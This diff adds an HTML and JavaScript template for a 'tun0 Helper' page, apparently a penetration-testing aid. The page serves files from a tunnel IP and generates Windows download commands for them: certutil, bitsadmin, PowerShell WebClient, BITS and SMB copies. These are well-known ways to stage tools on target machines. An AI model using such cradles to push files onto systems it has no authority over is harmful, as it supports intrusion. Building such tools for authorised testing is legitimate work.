@@ -1,0 +1,488 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Windows Download Commands — tun0 Helper</title>
+
+  <!-- Customize:
+       - Wider page: tweak .container max-width.
+       - Taller command boxes: increase pre { min-height: ... }.
+       - Button size: adjust .btn padding.
+       - File list: fetched from /api/files (mounted folder).
+       - File listener: start/stop arbitrary port; logs are from embedded HTTP server.
+  -->
+
+  <style>
+    :root { --bg:#0b1020; --card:#121832; --text:#e8ecf8; --muted:#a7b0ce; --accent:#8ab4ff; --ok:#6ee7b7; --warn:#fbbf24; --err:#f87171; }
+    * { box-sizing: border-box; }
+    body { margin:0; font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, "Helvetica Neue", Noto Sans, Arial, "Apple Color Emoji", "Segoe UI Emoji"; background:var(--bg); color:var(--text); }
+    .container { max-width: 1280px; margin: 40px auto; padding: 0 16px; }
+    .card { background:linear-gradient(180deg, rgba(255,255,255,0.04), rgba(255,255,255,0.02)); border:1px solid rgba(255,255,255,0.08); border-radius:20px; padding:24px; box-shadow: 0 10px 30px rgba(0,0,0,0.25); }
+    h1 { font-size: 28px; margin: 0 0 8px; letter-spacing: 0.2px; }
+    .grid { display:grid; grid-template-columns: 1fr; gap: 16px; }
+    @media (min-width: 900px) { .grid { grid-template-columns: 1fr; } }
+    label { font-size: 13px; letter-spacing: 0.3px; color: var(--muted); display:block; margin-bottom: 6px; }
+    .row { display:flex; gap: 12px; align-items: center; flex-wrap: wrap; }
+    input[type=text], input[type=number], select { width: 100%; padding: 12px 14px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.15); background: #0e1530; color: var(--text); outline: none; transition: border .2s ease; }
+    input[type=text]:focus, input[type=number]:focus, select:focus { border-color: var(--accent); }
+    .muted { color: var(--muted); }
+    .ip-pill, .pill { display:inline-flex; align-items:center; gap:8px; padding:6px 12px; border-radius: 999px; background: #0d1430; border:1px solid rgba(255,255,255,0.1); }
+    .btn { background: #1a244d; border: 1px solid rgba(255,255,255,0.12); color:var(--text); padding: 6px 10px; border-radius: 12px; cursor: pointer; transition: transform .05s ease, background .2s; }
+    .btn:hover { background:#233064; }
+    .btn:active { transform: translateY(1px); }
+    .section { margin-top: 10px; }
+    .section h3 { margin: 0 0 8px; font-size: 16px; letter-spacing: .3px; }
+    pre { position: relative; background: #0a1128; border:1px solid rgba(255,255,255,0.1); padding: 12px 14px; border-radius: 12px; white-space: pre-wrap; word-break: break-word; overflow-wrap: anywhere; line-height: 1.45; min-height: 28px; }
+    code { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; font-size: 13px; display: block; }
+    .copy { position:absolute; top:4px; right:8px; }
+    .tag { display:inline-block; font-size:11px; color:#101626; background: var(--ok); padding:2px 8px; border-radius:999px; margin-left:8px; }
+    .tag-warn { background: var(--warn); color:#101626; }
+    .hint { font-size:12px; color: var(--muted); margin-top:8px; }
+    .footer { margin-top: 24px; color: var(--muted); font-size: 12px; text-align:center; }
+    table { width:100%; border-collapse: collapse; }
+    th, td { text-align:left; padding:6px 8px; border-bottom: 1px solid rgba(255,255,255,0.06); font-size: 12px; }
+    .logwrap { max-height: 260px; overflow:auto; border:1px solid rgba(255,255,255,0.06); border-radius: 12px; }
+    .code-2xx { color: var(--ok); }
+    .code-3xx { color: var(--warn); }
+    .code-4xx, .code-5xx { color: var(--err); }
+  </style>
+</head>
+
+<body
+  data-env-static-ip="{{ env_static_ip|e }}"
+  data-env-tun-if="{{ env_tun_if|e }}"
+  data-base-path="{{ download_base_path|e }}"
+  data-serve-files="{{ '1' if serve_files else '0' }}"
+  data-app-port="{{ app_port }}"
+>
+  <div class="container">
+    <div class="card">
+      <h1>Windows Download Commands — <span class="muted">from your tunnel IP</span></h1>
+
+      <div class="grid">
+        <div>
+          <!-- IP detection + manual override -->
+          <div class="section" id="ipSection">
+            <div class="row">
+              <div class="ip-pill"><span id="ipText" data-detected-ip="">detecting…</span></div>
+              <button class="btn" id="refreshIpBtn">Refresh IP</button>
+              <button class="btn" id="editBtn">Edit</button>
+              <button class="btn" id="clearManualBtn" title="Clear saved manual IP">Clear manual</button>
+            </div>
+            <div id="manualNotice" class="hint" style="display:none;"><span class="tag tag-warn">Manual override is active</span></div>
+            <div class="row" id="ipEditRow" style="display:none; margin-top:8px;">
+              <input type="text" id="ipInput" placeholder="e.g. 10.8.0.5" />
+              <button class="btn" id="saveIpBtn">Save IP</button>
+            </div>
+          </div>
+
+          <!-- File listener control -->
+          <div class="section">
+            <label>File listener (serves mounted folder)</label>
+            <div class="row" style="gap:8px;">
+              <input type="number" id="filePort" placeholder="8443" min="1" max="65535" style="max-width:140px;">
+              <button class="btn" id="startFileBtn">Start</button>
+              <button class="btn" id="stopFileBtn">Stop</button>
+              <span id="fileSrvStatus" class="muted" style="margin-left:8px;"></span>
+            </div>
+            <div class="hint">With <code>--network=host</code>, starting the listener opens <code>host:&lt;port&gt;</code> instantly.</div>
+          </div>
+
+          <!-- File selection (mounted folder) -->
+          <div class="section">
+            <label>Select file from mounted folder</label>
+            <div class="row" style="gap:8px;">
+              <select id="fileSelect"></select>
+              <button class="btn" id="refreshFilesBtn" title="Reload file list">Refresh files</button>
+              <label class="muted" style="display:inline-flex; align-items:center; gap:6px; font-size:12px;">
+                <input type="checkbox" id="autoRefreshFiles" style="width:auto; margin:0;"> Auto-refresh
+              </label>
+            </div>
+          </div>
+
+          <!-- Manual filename / fallback port -->
+          <div class="section">
+            <label>Filename (overrides dropdown)</label>
+            <input type="text" id="filename" placeholder="example.zip" />
+          </div>
+          <div class="section">
+            <label>HTTP port (used when listener is <em>stopped</em>)</label>
+            <input type="number" id="fallbackPort" placeholder="3000 or 80" min="1" max="65535" />
+          </div>
+
+          <!-- Listening ports -->
+          <div class="section">
+            <label>Listening ports</label>
+            <div id="portsInfo" class="pill muted">loading…</div>
+          </div>
+
+          <!-- Logs -->
+          <div class="section">
+            <label>File listener logs</label>
+            <div class="row" style="gap:8px;">
+              <button class="btn" id="refreshLogsBtn">Refresh logs</button>
+              <label class="muted" style="display:inline-flex; align-items:center; gap:6px; font-size:12px;">
+                <input type="checkbox" id="autoRefreshLogs" style="width:auto; margin:0;"> Auto-refresh
+              </label>
+              <button class="btn" id="clearLogsBtn" title="Clear log buffer">Clear logs</button>
+            </div>
+            <div class="logwrap" style="margin-top:8px;">
+              <table>
+                <thead>
+                  <tr><th style="width:140px;">Time (UTC)</th><th style="width:90px;">Client</th><th style="width:70px;">Method</th><th>Path</th><th style="width:70px;">Code</th></tr>
+                </thead>
+                <tbody id="logsTbody">
+                  <tr><td colspan="5" class="muted">No data</td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        <!-- Commands column -->
+        <div>
+          <div class="section">
+            <h3>via <strong>cmd.exe</strong> <span class="tag">HTTP</span></h3>
+            <pre><button class="btn copy" data-copy="cmd1">Copy</button><code id="cmd1">curl.exe -L -o "&lt;filename&gt;" "http://&lt;ip&gt;[:&lt;port&gt;]&lt;base&gt;&lt;filename&gt;"</code></pre>
+            <pre style="margin-top:4px;"><button class="btn copy" data-copy="cmd2">Copy</button><code id="cmd2">certutil -urlcache -split -f "http://&lt;ip&gt;[:&lt;port&gt;]&lt;base&gt;&lt;filename&gt;" "&lt;filename&gt;"</code></pre>
+            <pre style="margin-top:4px;"><button class="btn copy" data-copy="cmd3">Copy</button><code id="cmd3">bitsadmin /transfer dl /download /priority normal "http://&lt;ip&gt;[:&lt;port&gt;]&lt;base&gt;&lt;filename&gt;" "&lt;filename&gt;"</code></pre>
+          </div>
+
+          <div class="section">
+            <h3>via <strong>PowerShell</strong> <span class="tag">HTTP</span></h3>
+            <pre><button class="btn copy" data-copy="ps1">Copy</button><code id="ps1">powershell -NoP -C "Invoke-WebRequest -Uri \"http://&lt;ip&gt;[:&lt;port&gt;]&lt;base&gt;&lt;filename&gt;\" -OutFile \"&lt;filename&gt;\""</code></pre>
+            <pre style="margin-top:4px;"><button class="btn copy" data-copy="ps2">Copy</button><code id="ps2">powershell -NoP -C "Start-BitsTransfer -Source \"http://&lt;ip&gt;[:&lt;port&gt;]&lt;base&gt;&lt;filename&gt;\" -Destination \"&lt;filename&gt;\""</code></pre>
+            <!-- WebClient / wget variants -->
+            <pre style="margin-top:8px;"><button class="btn copy" data-copy="ps3">Copy</button><code id="ps3">powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('http://&lt;ip&gt;[:&lt;port&gt;]&lt;base&gt;&lt;filename&gt;', '&lt;filename&gt;')"</code></pre>
+            <pre style="margin-top:4px;"><button class="btn copy" data-copy="ps4">Copy</button><code id="ps4">powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://&lt;ip&gt;[:&lt;port&gt;]&lt;base&gt;&lt;filename&gt;','&lt;filename&gt;')</code></pre>
+            <pre style="margin-top:4px;"><button class="btn copy" data-copy="ps5">Copy</button><code id="ps5">powershell.exe wget "http://&lt;ip&gt;[:&lt;port&gt;]&lt;base&gt;&lt;filename&gt;" -outfile "&lt;filename&gt;"</code></pre>
+          </div>
+
+          <div class="section">
+            <h3>via <strong>SMB</strong> <span class="tag">CIFS</span></h3>
+            <pre><button class="btn copy" data-copy="smb1">Copy</button><code id="smb1">copy "\\&lt;ip&gt;\share\&lt;filename&gt;" .</code></pre>
+            <pre style="margin-top:4px;"><button class="btn copy" data-copy="smb2">Copy</button><code id="smb2">powershell -NoP -C "Copy-Item -Path \"\\&lt;ip&gt;\share\&lt;filename&gt;\" -Destination ."</code></pre>
+          </div>
+
+          <div class="section">
+            <h3>via <strong>HTTP link</strong></h3>
+            <pre><button class="btn copy" data-copy="http1">Copy</button><code id="http1">start "" "http://&lt;ip&gt;[:&lt;port&gt;]&lt;base&gt;&lt;filename&gt;"</code></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="footer">
+        Mount your folder with <code>-v /host/downloads:/data</code>.
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // -------- Read config --------
+    const BASE_PATH_DEFAULT = (document.body.dataset.basePath || "/").replace(/\/?$/, "/");
+    const APP_PORT = parseInt(document.body.dataset.appPort || "3000", 10);
+    const LS_KEY = 'manualIpOverride';
+
+    // UI refs
+    const ipText = document.getElementById('ipText');
+    const refreshIpBtn = document.getElementById('refreshIpBtn');
+    const editBtn = document.getElementById('editBtn');
+    const ipEditRow = document.getElementById('ipEditRow');
+    const ipInput = document.getElementById('ipInput');
+    const saveIpBtn = document.getElementById('saveIpBtn');
+    const clearManualBtn = document.getElementById('clearManualBtn');
+    const manualNotice = document.getElementById('manualNotice');
+
+    const fileSelect = document.getElementById('fileSelect');
+    const refreshFilesBtn = document.getElementById('refreshFilesBtn');
+    const autoRefreshFiles = document.getElementById('autoRefreshFiles');
+
+    const filenameEl = document.getElementById('filename');
+    const fallbackPortEl = document.getElementById('fallbackPort');
+
+    const filePortEl = document.getElementById('filePort');
+    const startFileBtn = document.getElementById('startFileBtn');
+    const stopFileBtn = document.getElementById('stopFileBtn');
+    const fileSrvStatusEl = document.getElementById('fileSrvStatus');
+    const portsInfoEl = document.getElementById('portsInfo');
+
+    const refreshLogsBtn = document.getElementById('refreshLogsBtn');
+    const autoRefreshLogs = document.getElementById('autoRefreshLogs');
+    const clearLogsBtn = document.getElementById('clearLogsBtn');
+    const logsTbody = document.getElementById('logsTbody');
+
+    let manualOverride = localStorage.getItem(LS_KEY) || '';
+    let filesTimer = null;
+    let logsTimer = null;
+    let fileSrv = { running: false, port: null };
+
+    const ids = {
+      cmd1: document.getElementById('cmd1'),
+      cmd2: document.getElementById('cmd2'),
+      cmd3: document.getElementById('cmd3'),
+      ps1: document.getElementById('ps1'),
+      ps2: document.getElementById('ps2'),
+      ps3: document.getElementById('ps3'),
+      ps4: document.getElementById('ps4'),
+      ps5: document.getElementById('ps5'),
+      smb1: document.getElementById('smb1'),
+      smb2: document.getElementById('smb2'),
+      http1: document.getElementById('http1'),
+    };
+
+    function setManualIndicator(on) {
+      manualNotice.style.display = on ? 'block' : 'none';
+      if (on) { ipText.textContent = manualOverride; }
+    }
+
+    function copyTextUniversal(text) {
+      if (navigator.clipboard && window.isSecureContext) {
+        return navigator.clipboard.writeText(text);
+      }
+      return new Promise((resolve, reject) => {
+        try {
+          const ta = document.createElement('textarea');
+          ta.value = text;
+          ta.setAttribute('readonly', '');
+          ta.style.position = 'fixed';
+          ta.style.top = '-1000px';
+          ta.style.opacity = '0';
+          document.body.appendChild(ta);
+          ta.select();
+          document.execCommand('copy');
+          document.body.removeChild(ta);
+          resolve();
+        } catch (err) { reject(err); }
+      });
+    }
+
+    async function detectIP() {
+      if (manualOverride) { setManualIndicator(true); render(); return; }
+      ipText.textContent = 'detecting…';
+      try {
+        const r = await fetch('/api/ip', { cache: 'no-store' });
+        const j = await r.json();
+        if (j && j.ip) {
+          ipText.textContent = j.ip;
+          ipText.dataset.detectedIp = j.ip;
+          ipInput.value = j.ip;
+        } else {
+          ipText.textContent = 'not found';
+          ipText.dataset.detectedIp = '';
+        }
+      } catch (e) {
+        ipText.textContent = 'error';
+        ipText.dataset.detectedIp = '';
+      }
+      setManualIndicator(false);
+      render();
+    }
+
+    async function loadFiles() {
+      try {
+        const r = await fetch('/api/files', { cache: 'no-store' });
+        const j = await r.json();
+        const files = Array.isArray(j.files) ? j.files : [];
+        fileSelect.innerHTML = '';
+        const placeholder = document.createElement('option');
+        placeholder.value = '';
+        placeholder.textContent = files.length ? '— choose a file —' : '(no files found)';
+        fileSelect.appendChild(placeholder);
+        for (const f of files) {
+          const opt = document.createElement('option');
+          opt.value = f;
+          opt.textContent = f;
+          fileSelect.appendChild(opt);
+        }
+      } catch {
+        fileSelect.innerHTML = '<option value="">(error loading files)</option>';
+      }
+    }
+
+    function startFilesAutoRefresh() {
+      if (filesTimer) clearInterval(filesTimer);
+      if (autoRefreshFiles.checked) {
+        filesTimer = setInterval(loadFiles, 5000);
+      }
+    }
+
+    async function updateFileSrvStatus() {
+      try {
+        const r = await fetch('/api/file-listener', { cache: 'no-store' });
+        const j = await r.json();
+        fileSrv = { running: !!j.running, port: j.port || null };
+      } catch {
+        fileSrv = { running: false, port: null };
+      }
+      if (!filePortEl.value) filePortEl.value = fileSrv.port || 8443;
+      fileSrvStatusEl.textContent = fileSrv.running ? `Running on :${fileSrv.port}` : 'Stopped';
+      const parts = [`UI:${document.body.dataset.appPort}`];
+      if (fileSrv.running) parts.push(`Files:${fileSrv.port}`);
+      portsInfoEl.textContent = parts.join('  |  ');
+      render();
+    }
+
+    async function startFileSrv() {
+      const p = parseInt(filePortEl.value || "8443", 10);
+      const res = await fetch(`/api/file-listener/start?port=${encodeURIComponent(p)}`, { method: 'POST' });
+      const j = await res.json();
+      if (!res.ok) {
+        fileSrvStatusEl.textContent = `Error: ${j.error || 'failed'}`;
+      }
+      await updateFileSrvStatus();
+      await loadLogs();
+    }
+
+    async function stopFileSrv() {
+      await fetch('/api/file-listener/stop', { method: 'POST' });
+      await updateFileSrvStatus();
+    }
+
+    function getState() {
+      const ip = (manualOverride || ipText.textContent || '').trim();
+      const filename = (filenameEl.value || '').trim() || fileSelect.value || '';
+      const fallbackPortRaw = (fallbackPortEl.value || '').trim();
+      const fallbackPort = fallbackPortRaw === '' ? '' : String(Math.max(1, Math.min(65535, Number(fallbackPortRaw) || 0)));
+      return { ip, filename, fallbackPort };
+    }
+
+    function buildURL(ip, effectivePort, basePath, filename) {
+      if (!ip || !filename) return '';
+      const enc = encodeURIComponent(filename);
+      const portSeg = effectivePort && effectivePort !== '80' ? ':' + effectivePort : '';
+      const base = basePath.startsWith('/') ? basePath : '/' + basePath;
+      return `http://${ip}${portSeg}${base}${enc}`;
+    }
+
+    function q(s)  { return '"'  + s.replaceAll('"', '\\"') + '"'; }
+    function qs(s) { return "'"  + s.replaceAll("'", "\\'") + "'"; }
+
+    function render() {
+      const { ip, filename, fallbackPort } = getState();
+      const effectivePort = fileSrv.running ? String(fileSrv.port) : (fallbackPort || document.body.dataset.appPort);
+      const basePath = fileSrv.running ? "/" : BASE_PATH_DEFAULT;
+      const url = buildURL(ip, effectivePort, basePath, filename);
+
+      ids.cmd1.textContent = (ip && filename) ? `curl.exe -L -o ${q(filename)} ${q(url)}` : 'curl.exe -L -o "<filename>" "http://<ip>[:<port>]<base><filename>"';
+      ids.cmd2.textContent = (ip && filename) ? `certutil -urlcache -split -f ${q(url)} ${q(filename)}` : 'certutil -urlcache -split -f "http://<ip>[:<port>]<base><filename>" "<filename>"';
+      ids.cmd3.textContent = (ip && filename) ? `bitsadmin /transfer dl /download /priority normal ${q(url)} ${q(filename)}` : 'bitsadmin /transfer dl /download /priority normal "http://<ip>[:<port>]<base><filename>" "<filename>"';
+
+      ids.ps1.textContent = (ip && filename) ? `powershell -NoP -C "Invoke-WebRequest -Uri ${q(url)} -OutFile ${q(filename)}"` : 'powershell -NoP -C "Invoke-WebRequest -Uri \\"http://<ip>[:<port>]<base><filename>\\" -OutFile \\"<filename>\\""';
+
+      ids.ps2.textContent = (ip && filename) ? `powershell -NoP -C "Start-BitsTransfer -Source ${q(url)} -Destination ${q(filename)}"` : 'powershell -NoP -C "Start-BitsTransfer -Source \\"http://<ip>[:<port>]<base><filename>\\" -Destination \\"<filename>\\""';
+
+      if (ip && filename) {
+        ids.ps3.textContent = `powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile(${qs(url)}, ${qs(filename)})"`;
+        ids.ps4.textContent = `powershell.exe -c (new-object System.Net.WebClient).DownloadFile(${qs(url)},${qs(filename)})`;
+        ids.ps5.textContent = `powershell.exe wget ${q(url)} -outfile ${q(filename)}`;
+      } else {
+        ids.ps3.textContent = `powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('http://<ip>[:<port>]<base><filename>', '<filename>')"`;
+        ids.ps4.textContent = `powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://<ip>[:<port>]<base><filename>','<filename>')`;
+        ids.ps5.textContent = `powershell.exe wget "http://<ip>[:<port>]<base><filename>" -outfile "<filename>"`;
+      }
+
+      const smbPath = (ip && filename) ? `\\\\${ip}\\share\\${filename}` : `\\\\<ip>\\share\\<filename>`;
+      ids.smb1.textContent = `copy ${q(smbPath)} .`;
+      ids.smb2.textContent = `powershell -NoP -C "Copy-Item -Path ${q(smbPath)} -Destination ."`;      
+
+      ids.http1.textContent = url ? `start "" ${q(url)}` : 'start "" "http://<ip>[:<port>]<base><filename>"';
+    }
+
+    // ----- Logs -----
+    function codeClass(code) {
+      const n = parseInt(code, 10);
+      if (isNaN(n)) return '';
+      if (n >= 500) return 'code-5xx';
+      if (n >= 400) return 'code-4xx';
+      if (n >= 300) return 'code-3xx';
+      if (n >= 200) return 'code-2xx';
+      return '';
+    }
+
+    async function loadLogs() {
+      try {
+        const r = await fetch('/api/file-listener/logs?limit=200&ts=' + Date.now(), { cache: 'no-store' });
+        const j = await r.json();
+        const logs = Array.isArray(j.logs) ? j.logs : [];
+        if (!logs.length) {
+          logsTbody.innerHTML = '<tr><td colspan="5" class="muted">No data</td></tr>';
+          return;
+        }
+        logsTbody.innerHTML = logs.map(e => {
+          const esc = (s) => (s || '').toString()
+              .replaceAll('&','&amp;').replaceAll('<','&lt;').replaceAll('>','&gt;');
+          const cc = codeClass(e.code);
+          return `<tr>
+            <td>${esc(e.time)}</td>
+            <td>${esc(e.client)}</td>
+            <td>${esc(e.method)}</td>
+            <td style="word-break:break-all;">${esc(e.path)}</td>
+            <td class="${cc}">${esc(e.code)}</td>
+          </tr>`;
+        }).join('');
+      } catch {
+        logsTbody.innerHTML = '<tr><td colspan="5" class="muted">Error loading logs</td></tr>';
+      }
+    }
+
+    function startLogsAutoRefresh() {
+      if (logsTimer) clearInterval(logsTimer);
+      if (autoRefreshLogs.checked) {
+        logsTimer = setInterval(loadLogs, 2000);
+      }
+    }
+
+    async function clearLogs() {
+      await fetch('/api/file-listener/logs/clear', { method: 'POST' });
+      await loadLogs();
+    }
+
+    // ----- Wire up -----
+    document.addEventListener('input', render);
+
+    refreshIpBtn.addEventListener('click', () => { manualOverride = localStorage.getItem(LS_KEY) || ''; detectIP(); });
+    editBtn.addEventListener('click', () => {
+      const cur = ipText.textContent.trim();
+      ipEditRow.style.display = (ipEditRow.style.display === 'none' || !ipEditRow.style.display) ? 'block' : 'none';
+      ipInput.value = manualOverride || (cur && cur !== 'not found' && cur !== 'detecting…' && cur !== 'error' ? cur : '');
+      ipInput.focus();
+    });
+    saveIpBtn.addEventListener('click', () => {
+      const val = ipInput.value.trim();
+      if (val) { manualOverride = val; localStorage.setItem(LS_KEY, val); ipText.textContent = val; setManualIndicator(true); ipEditRow.style.display = 'none'; render(); }
+    });
+    clearManualBtn.addEventListener('click', () => { localStorage.removeItem(LS_KEY); manualOverride = ''; setManualIndicator(false); detectIP(); });
+
+    document.body.addEventListener('click', (e) => {
+      const btn = e.target.closest('button.copy'); if (!btn) return;
+      const id = btn.getAttribute('data-copy'); const codeEl = document.getElementById(id); if (!codeEl) return;
+      copyTextUniversal(codeEl.textContent).then(() => {
+        const old = btn.textContent; btn.textContent = 'Copied!'; setTimeout(() => (btn.textContent = old), 900);
+      }).catch(() => {});
+    });
+
+    fileSelect.addEventListener('change', () => {
+      if (fileSelect.value) { filenameEl.value = fileSelect.value; render(); }
+    });
+    refreshFilesBtn.addEventListener('click', loadFiles);
+    autoRefreshFiles.addEventListener('change', startFilesAutoRefresh);
+
+    startFileBtn.addEventListener('click', startFileSrv);
+    stopFileBtn.addEventListener('click', stopFileSrv);
+
+    refreshLogsBtn.addEventListener('click', loadLogs);
+    autoRefreshLogs.addEventListener('change', startLogsAutoRefresh);
+    clearLogsBtn.addEventListener('click', clearLogs);
+
+    // ----- First paint + fetch -----
+    render();
+    detectIP();
+    loadFiles();
+    startFilesAutoRefresh();
+    updateFileSrvStatus();
+    loadLogs();
+    startLogsAutoRefresh();
+  </script>
+</body>
+</html>
